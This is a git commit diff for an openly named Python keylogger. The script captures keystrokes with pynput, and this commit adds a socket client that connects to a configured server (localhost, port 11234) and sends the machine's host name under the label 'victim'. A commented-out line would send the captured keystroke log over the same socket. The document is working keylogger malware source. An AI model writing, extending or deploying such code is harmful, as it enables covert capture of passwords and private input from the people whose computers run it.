5247858fd23f7faf86103248c25698582c96cf24
the-scripting-boy <hectorpadint00@gmail.com>
2021-02-18 21:04:03 +0100

    Created a server to send keys using sockets.

--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,20 @@
 #!/usr/bin/env python3
-import pynput.keyboard
-import threading
+from pynput import keyboard
+from threading import Timer
+import socket
 
 
 class Keylogger:
-    def __init__(self, interval):
+    def __init__(self, interval, ip, port, h_length):
         self.interval = interval
-        self.log = "Keylogger started."
+        self.log = ""
+        pc_name = socket.gethostname()
+        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.client_socket.connect((ip, port))
+        self.client_socket.setblocking(False)
+        self.victim = pc_name.encode('utf-8')
+        start_header = f"{len(pc_name):<{h_length}}".encode('utf-8')
+        self.client_socket.send(start_header + self.victim)
 
     # function to add keys 2 the current ones
     def _append_to_log(self, string):
@@ -25,14 +33,14 @@ class Keylogger:
 
     # function to print the user input in the given interval
     def _report(self):
-        print(self.log)
+        # self.client_socket.send(self.log.encode('utf-8'))
         self.log = ""
-        timer = threading.Timer(self.interval, self._report)
+        timer = Timer(self.interval, self._report)
         timer.start()
 
     def start(self):
         # listening the user input
-        keyboard_listener = pynput.keyboard.Listener(on_press=self._process_key_press)
+        keyboard_listener = keyboard.Listener(on_press=self._process_key_press)
         with keyboard_listener:
             # starts printing keys on the screen
             self._report()
@@ -41,6 +49,6 @@ class Keylogger:
 
 
 # adding a print interval of 10 seconds
-keylogger = Keylogger(10)
+keylogger = Keylogger(10, "127.0.0.1", 11234, 10)
 # starting the keyloggger
 keylogger.start()
